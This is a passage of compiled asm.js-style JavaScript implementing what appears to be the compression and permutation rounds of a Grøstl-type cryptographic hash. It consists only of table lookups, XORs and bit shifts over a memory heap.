        a[g + 9 >> 0] = n >>> 8;
        a[g + 10 >> 0] = n >>> 16;
        a[g + 11 >> 0] = n >>> 24;
        a[g + 12 >> 0] = o;
        a[g + 13 >> 0] = o >>> 8;
        a[g + 14 >> 0] = o >>> 16;
        a[g + 15 >> 0] = o >>> 24;
        a[g + 16 >> 0] = q;
        a[g + 17 >> 0] = a[s + 49 >> 0] | 0;
        a[g + 18 >> 0] = a[s + 50 >> 0] | 0;
        a[g + 19 >> 0] = a[s + 51 >> 0] | 0;
        a[g + 20 >> 0] = a[r >> 0] | 0;
        a[g + 21 >> 0] = a[s + 53 >> 0] | 0;
        a[g + 22 >> 0] = a[s + 54 >> 0] | 0;
        a[g + 23 >> 0] = a[s + 55 >> 0] | 0;
        a[g + 24 >> 0] = a[v >> 0] | 0;
        a[g + 25 >> 0] = a[s + 57 >> 0] | 0;
        a[g + 26 >> 0] = a[s + 58 >> 0] | 0;
        a[g + 27 >> 0] = a[s + 59 >> 0] | 0;
        a[g + 28 >> 0] = a[t >> 0] | 0;
        a[g + 29 >> 0] = a[s + 61 >> 0] | 0;
        a[g + 30 >> 0] = a[s + 62 >> 0] | 0;
        a[g + 31 >> 0] = a[s + 63 >> 0] | 0;
        l = u;
        return
    }

    function Ja(a, b, d) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        var e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            y = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0,
            L = 0,
            M = 0,
            N = 0,
            O = 0,
            P = 0,
            Q = 0,
            R = 0,
            S = 0;
        S = l;
        l = l + 256 | 0;
        C = S + 192 | 0;
        N = S + 128 | 0;
        O = S + 64 | 0;
        P = S;
        if ((d | 0) <= 63) {
            l = S;
            return
        }
        Q = a + 4 | 0;
        R = C + 4 | 0;
        h = a + 8 | 0;
        i = C + 8 | 0;
        j = a + 12 | 0;
        k = C + 12 | 0;
        m = a + 16 | 0;
        n = C + 16 | 0;
        o = a + 20 | 0;
        p = C + 20 | 0;
        q = a + 24 | 0;
        r = C + 24 | 0;
        s = a + 28 | 0;
        t = C + 28 | 0;
        u = a + 32 | 0;
        v = C + 32 | 0;
        w = a + 36 | 0;
        x = C + 36 | 0;
        y = a + 40 | 0;
        z = C + 40 | 0;
        A = a + 44 | 0;
        B = C + 44 | 0;
        D = a + 48 | 0;
        E = C + 48 | 0;
        F = a + 52 | 0;
        G = C + 52 | 0;
        H = a + 56 | 0;
        I = C + 56 | 0;
        J = a + 60 | 0;
        K = C + 60 | 0;
        L = a + 64 | 0;
        M = a + 68 | 0;
        g = d;
        while (1) {
            d = P;
            e = b;
            f = d + 64 | 0;
            do {
                c[d >> 2] = c[e >> 2];
                d = d + 4 | 0;
                e = e + 4 | 0
            } while ((d | 0) < (f | 0));
            c[C >> 2] = c[a >> 2] ^ c[b >> 2];
            c[R >> 2] = c[Q >> 2] ^ c[b + 4 >> 2];
            c[i >> 2] = c[h >> 2] ^ c[b + 8 >> 2];
            c[k >> 2] = c[j >> 2] ^ c[b + 12 >> 2];
            c[n >> 2] = c[m >> 2] ^ c[b + 16 >> 2];
            c[p >> 2] = c[o >> 2] ^ c[b + 20 >> 2];
            c[r >> 2] = c[q >> 2] ^ c[b + 24 >> 2];
            c[t >> 2] = c[s >> 2] ^ c[b + 28 >> 2];
            c[v >> 2] = c[u >> 2] ^ c[b + 32 >> 2];
            c[x >> 2] = c[w >> 2] ^ c[b + 36 >> 2];
            c[z >> 2] = c[y >> 2] ^ c[b + 40 >> 2];
            c[B >> 2] = c[A >> 2] ^ c[b + 44 >> 2];
            c[E >> 2] = c[D >> 2] ^ c[b + 48 >> 2];
            c[G >> 2] = c[F >> 2] ^ c[b + 52 >> 2];
            c[I >> 2] = c[H >> 2] ^ c[b + 56 >> 2];
            c[K >> 2] = c[J >> 2] ^ c[b + 60 >> 2];
            La(P, O, 0);
            La(O, P, 16777216);
            La(P, O, 33554432);
            La(O, P, 50331648);
            La(P, O, 67108864);
            La(O, P, 83886080);
            La(P, O, 100663296);
            La(O, P, 117440512);
            La(P, O, 134217728);
            La(O, N, 150994944);
            Ka(C, O, 0);
            Ka(O, P, 1);
            Ka(P, O, 2);
            Ka(O, P, 3);
            Ka(P, O, 4);
            Ka(O, P, 5);
            Ka(P, O, 6);
            Ka(O, P, 7);
            Ka(P, O, 8);
            Ka(O, C, 9);
            d = 0;
            do {
                f = a + (d << 2) | 0;
                c[f >> 2] = c[N + (d << 2) >> 2] ^ c[C + (d << 2) >> 2] ^ c[f >> 2];
                d = d + 1 | 0
            } while ((d | 0) != 16);
            f = (c[L >> 2] | 0) + 1 | 0;
            c[L >> 2] = f;
            if (!f) c[M >> 2] = (c[M >> 2] | 0) + 1;
            g = g + -64 | 0;
            if ((g | 0) <= 63) break;
            else b = b + 64 | 0
        }
        l = S;
        return
    }

    function Ka(a, b, e) {
        a = a | 0;
        b = b | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            y = 0,
            z = 0;
        v = c[a >> 2] ^ e;
        c[a >> 2] = v;
        u = a + 8 | 0;
        z = e ^ 16 ^ c[u >> 2];
        c[u >> 2] = z;
        x = a + 16 | 0;
        f = e ^ 32 ^ c[x >> 2];
        c[x >> 2] = f;
        r = a + 24 | 0;
        h = e ^ 48 ^ c[r >> 2];
        c[r >> 2] = h;
        s = a + 32 | 0;
        c[s >> 2] = e ^ 64 ^ c[s >> 2];
        q = a + 40 | 0;
        c[q >> 2] = e ^ 80 ^ c[q >> 2];
        t = a + 48 | 0;
        c[t >> 2] = e ^ 96 ^ c[t >> 2];
        p = a + 56 | 0;
        c[p >> 2] = e ^ 112 ^ c[p >> 2];
        v = v << 1 & 510;
        z = z >>> 7 & 510;
        e = c[4768 + (z << 2) >> 2] | 0;
        z = c[4768 + ((z | 1) << 2) >> 2] | 0;
        f = f >>> 15 & 510;
        g = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        h = h >>> 24 << 1;
        i = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        j = (d[a + 36 >> 0] | 0) << 1;
        k = (d[a + 45 >> 0] | 0) << 1;
        l = c[4768 + (k << 2) >> 2] | 0;
        k = c[4768 + ((k | 1) << 2) >> 2] | 0;
        m = (d[a + 54 >> 0] | 0) << 1;
        n = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        o = (d[a + 63 >> 0] | 0) << 1;
        w = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        y = (z << 8 | e >>> 24) ^ c[4768 + ((v | 1) << 2) >> 2] ^ (f << 16 | g >>> 16) ^ (h << 24 | i >>> 8) ^ c[4768 + (j << 2) >> 2] ^ (k >>> 24 | l << 8) ^ (m >>> 16 | n << 16) ^ (o >>> 8 | w << 24);
        c[b >> 2] = (z >>> 24 | e << 8) ^ c[4768 + (v << 2) >> 2] ^ (f >>> 16 | g << 16) ^ (h >>> 8 | i << 24) ^ c[4768 + ((j | 1) << 2) >> 2] ^ (k << 8 | l >>> 24) ^ (m << 16 | n >>> 16) ^ (o << 24 | w >>> 8);
        c[b + 4 >> 2] = y;
        u = (d[u >> 0] | 0) << 1;
        y = (d[a + 17 >> 0] | 0) << 1;
        w = c[4768 + (y << 2) >> 2] | 0;
        y = c[4768 + ((y | 1) << 2) >> 2] | 0;
        o = (d[a + 26 >> 0] | 0) << 1;
        n = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        m = (d[a + 35 >> 0] | 0) << 1;
        l = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        k = (d[a + 44 >> 0] | 0) << 1;
        j = (d[a + 53 >> 0] | 0) << 1;
        i = c[4768 + (j << 2) >> 2] | 0;
        j = c[4768 + ((j | 1) << 2) >> 2] | 0;
        h = (d[a + 62 >> 0] | 0) << 1;
        g = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        f = (d[a + 7 >> 0] | 0) << 1;
        v = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        e = (y << 8 | w >>> 24) ^ c[4768 + ((u | 1) << 2) >> 2] ^ (o << 16 | n >>> 16) ^ (m << 24 | l >>> 8) ^ c[4768 + (k << 2) >> 2] ^ (j >>> 24 | i << 8) ^ (h >>> 16 | g << 16) ^ (f >>> 8 | v << 24);
        c[b + 8 >> 2] = (y >>> 24 | w << 8) ^ c[4768 + (u << 2) >> 2] ^ (o >>> 16 | n << 16) ^ (m >>> 8 | l << 24) ^ c[4768 + ((k | 1) << 2) >> 2] ^ (j << 8 | i >>> 24) ^ (h << 16 | g >>> 16) ^ (f << 24 | v >>> 8);
        c[b + 12 >> 2] = e;
        e = (d[x >> 0] | 0) << 1;
        x = (d[a + 25 >> 0] | 0) << 1;
        v = c[4768 + (x << 2) >> 2] | 0;
        x = c[4768 + ((x | 1) << 2) >> 2] | 0;
        f = (d[a + 34 >> 0] | 0) << 1;
        g = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        h = (d[a + 43 >> 0] | 0) << 1;
        i = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        j = (d[a + 52 >> 0] | 0) << 1;
        k = (d[a + 61 >> 0] | 0) << 1;
        l = c[4768 + (k << 2) >> 2] | 0;
        k = c[4768 + ((k | 1) << 2) >> 2] | 0;
        m = (d[a + 6 >> 0] | 0) << 1;
        n = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        o = (d[a + 15 >> 0] | 0) << 1;
        u = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        w = (x << 8 | v >>> 24) ^ c[4768 + ((e | 1) << 2) >> 2] ^ (f << 16 | g >>> 16) ^ (h << 24 | i >>> 8) ^ c[4768 + (j << 2) >> 2] ^ (k >>> 24 | l << 8) ^ (m >>> 16 | n << 16) ^ (o >>> 8 | u << 24);
        c[b + 16 >> 2] = (x >>> 24 | v << 8) ^ c[4768 + (e << 2) >> 2] ^ (f >>> 16 | g << 16) ^ (h >>> 8 | i << 24) ^ c[4768 + ((j | 1) << 2) >> 2] ^ (k << 8 | l >>> 24) ^ (m << 16 | n >>> 16) ^ (o << 24 | u >>> 8);
        c[b + 20 >> 2] = w;
        r = (d[r >> 0] | 0) << 1;
        w = (d[a + 33 >> 0] | 0) << 1;
        u = c[4768 + (w << 2) >> 2] | 0;
        w = c[4768 + ((w | 1) << 2) >> 2] | 0;
        o = (d[a + 42 >> 0] | 0) << 1;
        n = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        m = (d[a + 51 >> 0] | 0) << 1;
        l = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        k = (d[a + 60 >> 0] | 0) << 1;
        j = (d[a + 5 >> 0] | 0) << 1;
        i = c[4768 + (j << 2) >> 2] | 0;
        j = c[4768 + ((j | 1) << 2) >> 2] | 0;
        h = (d[a + 14 >> 0] | 0) << 1;
        g = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        f = (d[a + 23 >> 0] | 0) << 1;
        e = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        v = (w << 8 | u >>> 24) ^ c[4768 + ((r | 1) << 2) >> 2] ^ (o << 16 | n >>> 16) ^ (m << 24 | l >>> 8) ^ c[4768 + (k << 2) >> 2] ^ (j >>> 24 | i << 8) ^ (h >>> 16 | g << 16) ^ (f >>> 8 | e << 24);
        c[b + 24 >> 2] = (w >>> 24 | u << 8) ^ c[4768 + (r << 2) >> 2] ^ (o >>> 16 | n << 16) ^ (m >>> 8 | l << 24) ^ c[4768 + ((k | 1) << 2) >> 2] ^ (j << 8 | i >>> 24) ^ (h << 16 | g >>> 16) ^ (f << 24 | e >>> 8);
        c[b + 28 >> 2] = v;
        s = (d[s >> 0] | 0) << 1;
        v = (d[a + 41 >> 0] | 0) << 1;
        e = c[4768 + (v << 2) >> 2] | 0;
        v = c[4768 + ((v | 1) << 2) >> 2] | 0;
        f = (d[a + 50 >> 0] | 0) << 1;
        g = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        h = (d[a + 59 >> 0] | 0) << 1;
        i = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        j = (d[a + 4 >> 0] | 0) << 1;
        k = (d[a + 13 >> 0] | 0) << 1;
        l = c[4768 + (k << 2) >> 2] | 0;
        k = c[4768 + ((k | 1) << 2) >> 2] | 0;
        m = (d[a + 22 >> 0] | 0) << 1;
        n = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        o = (d[a + 31 >> 0] | 0) << 1;
        r = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        u = (v << 8 | e >>> 24) ^ c[4768 + ((s | 1) << 2) >> 2] ^ (f << 16 | g >>> 16) ^ (h << 24 | i >>> 8) ^ c[4768 + (j << 2) >> 2] ^ (k >>> 24 | l << 8) ^ (m >>> 16 | n << 16) ^ (o >>> 8 | r << 24);
        c[b + 32 >> 2] = (v >>> 24 | e << 8) ^ c[4768 + (s << 2) >> 2] ^ (f >>> 16 | g << 16) ^ (h >>> 8 | i << 24) ^ c[4768 + ((j | 1) << 2) >> 2] ^ (k << 8 | l >>> 24) ^ (m << 16 | n >>> 16) ^ (o << 24 | r >>> 8);
        c[b + 36 >> 2] = u;
        q = (d[q >> 0] | 0) << 1;
        u = (d[a + 49 >> 0] | 0) << 1;
        r = c[4768 + (u << 2) >> 2] | 0;
        u = c[4768 + ((u | 1) << 2) >> 2] | 0;
        o = (d[a + 58 >> 0] | 0) << 1;
        n = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        m = (d[a + 3 >> 0] | 0) << 1;
        l = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        k = (d[a + 12 >> 0] | 0) << 1;
        j = (d[a + 21 >> 0] | 0) << 1;
        i = c[4768 + (j << 2) >> 2] | 0;
        j = c[4768 + ((j | 1) << 2) >> 2] | 0;
        h = (d[a + 30 >> 0] | 0) << 1;
        g = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        f = (d[a + 39 >> 0] | 0) << 1;
        s = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        e = (u << 8 | r >>> 24) ^ c[4768 + ((q | 1) << 2) >> 2] ^ (o << 16 | n >>> 16) ^ (m << 24 | l >>> 8) ^ c[4768 + (k << 2) >> 2] ^ (j >>> 24 | i << 8) ^ (h >>> 16 | g << 16) ^ (f >>> 8 | s << 24);
        c[b + 40 >> 2] = (u >>> 24 | r << 8) ^ c[4768 + (q << 2) >> 2] ^ (o >>> 16 | n << 16) ^ (m >>> 8 | l << 24) ^ c[4768 + ((k | 1) << 2) >> 2] ^ (j << 8 | i >>> 24) ^ (h << 16 | g >>> 16) ^ (f << 24 | s >>> 8);
        c[b + 44 >> 2] = e;
        e = (d[t >> 0] | 0) << 1;
        t = (d[a + 57 >> 0] | 0) << 1;
        s = c[4768 + (t << 2) >> 2] | 0;
        t = c[4768 + ((t | 1) << 2) >> 2] | 0;
        f = (d[a + 2 >> 0] | 0) << 1;
        g = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        h = (d[a + 11 >> 0] | 0) << 1;
        i = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        j = (d[a + 20 >> 0] | 0) << 1;
        k = (d[a + 29 >> 0] | 0) << 1;
        l = c[4768 + (k << 2) >> 2] | 0;
        k = c[4768 + ((k | 1) << 2) >> 2] | 0;
        m = (d[a + 38 >> 0] | 0) << 1;
        n = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        o = (d[a + 47 >> 0] | 0) << 1;
        q = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        r = (t << 8 | s >>> 24) ^ c[4768 + ((e | 1) << 2) >> 2] ^ (f << 16 | g >>> 16) ^ (h << 24 | i >>> 8) ^ c[4768 + (j << 2) >> 2] ^ (k >>> 24 | l << 8) ^ (m >>> 16 | n << 16) ^ (o >>> 8 | q << 24);
        c[b + 48 >> 2] = (t >>> 24 | s << 8) ^ c[4768 + (e << 2) >> 2] ^ (f >>> 16 | g << 16) ^ (h >>> 8 | i << 24) ^ c[4768 + ((j | 1) << 2) >> 2] ^ (k << 8 | l >>> 24) ^ (m << 16 | n >>> 16) ^ (o << 24 | q >>> 8);
        c[b + 52 >> 2] = r;
        p = (d[p >> 0] | 0) << 1;
        r = (d[a + 1 >> 0] | 0) << 1;
        q = c[4768 + (r << 2) >> 2] | 0;
        r = c[4768 + ((r | 1) << 2) >> 2] | 0;
        o = (d[a + 10 >> 0] | 0) << 1;
        n = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        m = (d[a + 19 >> 0] | 0) << 1;
        l = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        k = (d[a + 28 >> 0] | 0) << 1;
        j = (d[a + 37 >> 0] | 0) << 1;
        i = c[4768 + (j << 2) >> 2] | 0;
        j = c[4768 + ((j | 1) << 2) >> 2] | 0;
        h = (d[a + 46 >> 0] | 0) << 1;
        g = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        f = (d[a + 55 >> 0] | 0) << 1;
        a = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        e = (r << 8 | q >>> 24) ^ c[4768 + ((p | 1) << 2) >> 2] ^ (o << 16 | n >>> 16) ^ (m << 24 | l >>> 8) ^ c[4768 + (k << 2) >> 2] ^ (j >>> 24 | i << 8) ^ (h >>> 16 | g << 16) ^ (f >>> 8 | a << 24);
        c[b + 56 >> 2] = (r >>> 24 | q << 8) ^ c[4768 + (p << 2) >> 2] ^ (o >>> 16 | n << 16) ^ (m >>> 8 | l << 24) ^ c[4768 + ((k | 1) << 2) >> 2] ^ (j << 8 | i >>> 24) ^ (h << 16 | g >>> 16) ^ (f << 24 | a >>> 8);
        c[b + 60 >> 2] = e;
        return
    }

    function La(a, b, e) {
        a = a | 0;
        b = b | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            y = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0;
        c[a >> 2] = ~c[a >> 2];
        g = a + 4 | 0;
        c[g >> 2] = c[g >> 2] ^ ~e;
        o = a + 8 | 0;
        E = ~c[o >> 2];
        c[o >> 2] = E;
        o = a + 12 | 0;
        c[o >> 2] = e ^ -268435457 ^ c[o >> 2];
        z = a + 16 | 0;
        c[z >> 2] = ~c[z >> 2];
        h = a + 20 | 0;
        c[h >> 2] = e ^ -536870913 ^ c[h >> 2];
        B = a + 24 | 0;
        F = ~c[B >> 2];
        c[B >> 2] = F;
        n = a + 28 | 0;
        c[n >> 2] = e ^ -805306369 ^ c[n >> 2];
        v = a + 32 | 0;
        c[v >> 2] = ~c[v >> 2];
        i = a + 36 | 0;
        c[i >> 2] = e ^ -1073741825 ^ c[i >> 2];
        x = a + 40 | 0;
        A = ~c[x >> 2];
        c[x >> 2] = A;
        m = a + 44 | 0;
        c[m >> 2] = e ^ -1342177281 ^ c[m >> 2];
        p = a + 48 | 0;
        c[p >> 2] = ~c[p >> 2];
        j = a + 52 | 0;
        c[j >> 2] = e ^ -1610612737 ^ c[j >> 2];
        t = a + 56 | 0;
        s = ~c[t >> 2];
        c[t >> 2] = s;
        k = a + 60 | 0;
        c[k >> 2] = e ^ -1879048193 ^ c[k >> 2];
        e = E << 1 & 510;
        F = F >>> 7 & 510;
        E = c[4768 + (F << 2) >> 2] | 0;
        F = c[4768 + ((F | 1) << 2) >> 2] | 0;
        A = A >>> 15 & 510;
        w = c[4768 + (A << 2) >> 2] | 0;
        A = c[4768 + ((A | 1) << 2) >> 2] | 0;
        s = s >>> 24 << 1;
        f = c[4768 + (s << 2) >> 2] | 0;
        s = c[4768 + ((s | 1) << 2) >> 2] | 0;
        g = (d[g >> 0] | 0) << 1;
        l = (d[a + 21 >> 0] | 0) << 1;
        q = c[4768 + (l << 2) >> 2] | 0;
        l = c[4768 + ((l | 1) << 2) >> 2] | 0;
        r = (d[a + 38 >> 0] | 0) << 1;
        u = c[4768 + (r << 2) >> 2] | 0;
        r = c[4768 + ((r | 1) << 2) >> 2] | 0;
        y = (d[a + 55 >> 0] | 0) << 1;
        C = c[4768 + (y << 2) >> 2] | 0;
        y = c[4768 + ((y | 1) << 2) >> 2] | 0;
        D = (F << 8 | E >>> 24) ^ c[4768 + ((e | 1) << 2) >> 2] ^ (A << 16 | w >>> 16) ^ (s << 24 | f >>> 8) ^ c[4768 + (g << 2) >> 2] ^ (l >>> 24 | q << 8) ^ (r >>> 16 | u << 16) ^ (y >>> 8 | C << 24);
        c[b >> 2] = (F >>> 24 | E << 8) ^ c[4768 + (e << 2) >> 2] ^ (A >>> 16 | w << 16) ^ (s >>> 8 | f << 24) ^ c[4768 + ((g | 1) << 2) >> 2] ^ (l << 8 | q >>> 24) ^ (r << 16 | u >>> 16) ^ (y << 24 | C >>> 8);
        c[b + 4 >> 2] = D;
        z = (d[z >> 0] | 0) << 1;
        D = (d[a + 33 >> 0] | 0) << 1;
        C = c[4768 + (D << 2) >> 2] | 0;
        D = c[4768 + ((D | 1) << 2) >> 2] | 0;
        y = (d[a + 50 >> 0] | 0) << 1;
        u = c[4768 + (y << 2) >> 2] | 0;
        y = c[4768 + ((y | 1) << 2) >> 2] | 0;
        r = (d[a + 3 >> 0] | 0) << 1;
        q = c[4768 + (r << 2) >> 2] | 0;
        r = c[4768 + ((r | 1) << 2) >> 2] | 0;
        o = (d[o >> 0] | 0) << 1;
        l = (d[a + 29 >> 0] | 0) << 1;
        g = c[4768 + (l << 2) >> 2] | 0;
        l = c[4768 + ((l | 1) << 2) >> 2] | 0;
        f = (d[a + 46 >> 0] | 0) << 1;
        s = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        w = (d[a + 63 >> 0] | 0) << 1;
        A = c[4768 + (w << 2) >> 2] | 0;
        w = c[4768 + ((w | 1) << 2) >> 2] | 0;
        e = (D << 8 | C >>> 24) ^ c[4768 + ((z | 1) << 2) >> 2] ^ (y << 16 | u >>> 16) ^ (r << 24 | q >>> 8) ^ c[4768 + (o << 2) >> 2] ^ (l >>> 24 | g << 8) ^ (f >>> 16 | s << 16) ^ (w >>> 8 | A << 24);
        c[b + 8 >> 2] = (D >>> 24 | C << 8) ^ c[4768 + (z << 2) >> 2] ^ (y >>> 16 | u << 16) ^ (r >>> 8 | q << 24) ^ c[4768 + ((o | 1) << 2) >> 2] ^ (l << 8 | g >>> 24) ^ (f << 16 | s >>> 16) ^ (w << 24 | A >>> 8);
        c[b + 12 >> 2] = e;
        e = (d[B >> 0] | 0) << 1;
        B = (d[a + 41 >> 0] | 0) << 1;
        A = c[4768 + (B << 2) >> 2] | 0;
        B = c[4768 + ((B | 1) << 2) >> 2] | 0;
        w = (d[a + 58 >> 0] | 0) << 1;
        s = c[4768 + (w << 2) >> 2] | 0;
        w = c[4768 + ((w | 1) << 2) >> 2] | 0;
        f = (d[a + 11 >> 0] | 0) << 1;
        g = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        h = (d[h >> 0] | 0) << 1;
        l = (d[a + 37 >> 0] | 0) << 1;
        o = c[4768 + (l << 2) >> 2] | 0;
        l = c[4768 + ((l | 1) << 2) >> 2] | 0;
        q = (d[a + 54 >> 0] | 0) << 1;
        r = c[4768 + (q << 2) >> 2] | 0;
        q = c[4768 + ((q | 1) << 2) >> 2] | 0;
        u = (d[a + 7 >> 0] | 0) << 1;
        y = c[4768 + (u << 2) >> 2] | 0;
        u = c[4768 + ((u | 1) << 2) >> 2] | 0;
        z = (B << 8 | A >>> 24) ^ c[4768 + ((e | 1) << 2) >> 2] ^ (w << 16 | s >>> 16) ^ (f << 24 | g >>> 8) ^ c[4768 + (h << 2) >> 2] ^ (l >>> 24 | o << 8) ^ (q >>> 16 | r << 16) ^ (u >>> 8 | y << 24);
        c[b + 16 >> 2] = (B >>> 24 | A << 8) ^ c[4768 + (e << 2) >> 2] ^ (w >>> 16 | s << 16) ^ (f >>> 8 | g << 24) ^ c[4768 + ((h | 1) << 2) >> 2] ^ (l << 8 | o >>> 24) ^ (q << 16 | r >>> 16) ^ (u << 24 | y >>> 8);
        c[b + 20 >> 2] = z;
        v = (d[v >> 0] | 0) << 1;
        z = (d[a + 49 >> 0] | 0) << 1;
        y = c[4768 + (z << 2) >> 2] | 0;
        z = c[4768 + ((z | 1) << 2) >> 2] | 0;
        u = (d[a + 2 >> 0] | 0) << 1;
        r = c[4768 + (u << 2) >> 2] | 0;
        u = c[4768 + ((u | 1) << 2) >> 2] | 0;
        q = (d[a + 19 >> 0] | 0) << 1;
        o = c[4768 + (q << 2) >> 2] | 0;
        q = c[4768 + ((q | 1) << 2) >> 2] | 0;
        n = (d[n >> 0] | 0) << 1;
        l = (d[a + 45 >> 0] | 0) << 1;
        h = c[4768 + (l << 2) >> 2] | 0;
        l = c[4768 + ((l | 1) << 2) >> 2] | 0;
        g = (d[a + 62 >> 0] | 0) << 1;
        f = c[4768 + (g << 2) >> 2] | 0;
        g = c[4768 + ((g | 1) << 2) >> 2] | 0;
        s = (d[a + 15 >> 0] | 0) << 1;
        w = c[4768 + (s << 2) >> 2] | 0;
        s = c[4768 + ((s | 1) << 2) >> 2] | 0;
        e = (z << 8 | y >>> 24) ^ c[4768 + ((v | 1) << 2) >> 2] ^ (u << 16 | r >>> 16) ^ (q << 24 | o >>> 8) ^ c[4768 + (n << 2) >> 2] ^ (l >>> 24 | h << 8) ^ (g >>> 16 | f << 16) ^ (s >>> 8 | w << 24);
        c[b + 24 >> 2] = (z >>> 24 | y << 8) ^ c[4768 + (v << 2) >> 2] ^ (u >>> 16 | r << 16) ^ (q >>> 8 | o << 24) ^ c[4768 + ((n | 1) << 2) >> 2] ^ (l << 8 | h >>> 24) ^ (g << 16 | f >>> 16) ^ (s << 24 | w >>> 8);
        c[b + 28 >> 2] = e;
        e = (d[x >> 0] | 0) << 1;
        x = (d[a + 57 >> 0] | 0) << 1;
        w = c[4768 + (x << 2) >> 2] | 0;
        x = c[4768 + ((x | 1) << 2) >> 2] | 0;
        s = (d[a + 10 >> 0] | 0) << 1;
        f = c[4768 + (s << 2) >> 2] | 0;
        s = c[4768 + ((s | 1) << 2) >> 2] | 0;
        g = (d[a + 27 >> 0] | 0) << 1;
        h = c[4768 + (g << 2) >> 2] | 0;
        g = c[4768 + ((g | 1) << 2) >> 2] | 0;
        i = (d[i >> 0] | 0) << 1;
        l = (d[a + 53 >> 0] | 0) << 1;
        n = c[4768 + (l << 2) >> 2] | 0;
        l = c[4768 + ((l | 1) << 2) >> 2] | 0;
        o = (d[a + 6 >> 0] | 0) << 1;
        q = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        r = (d[a + 23 >> 0] | 0) << 1;
        u = c[4768 + (r << 2) >> 2] | 0;
        r = c[4768 + ((r | 1) << 2) >> 2] | 0;
        v = (x << 8 | w >>> 24) ^ c[4768 + ((e | 1) << 2) >> 2] ^ (s << 16 | f >>> 16) ^ (g << 24 | h >>> 8) ^ c[4768 + (i << 2) >> 2] ^ (l >>> 24 | n << 8) ^ (o >>> 16 | q << 16) ^ (r >>> 8 | u << 24);
        c[b + 32 >> 2] = (x >>> 24 | w << 8) ^ c[4768 + (e << 2) >> 2] ^ (s >>> 16 | f << 16) ^ (g >>> 8 | h << 24) ^ c[4768 + ((i | 1) << 2) >> 2] ^ (l << 8 | n >>> 24) ^ (o << 16 | q >>> 16) ^ (r << 24 | u >>> 8);
        c[b + 36 >> 2] = v;
        p = (d[p >> 0] | 0) << 1;
        v = (d[a + 1 >> 0] | 0) << 1;
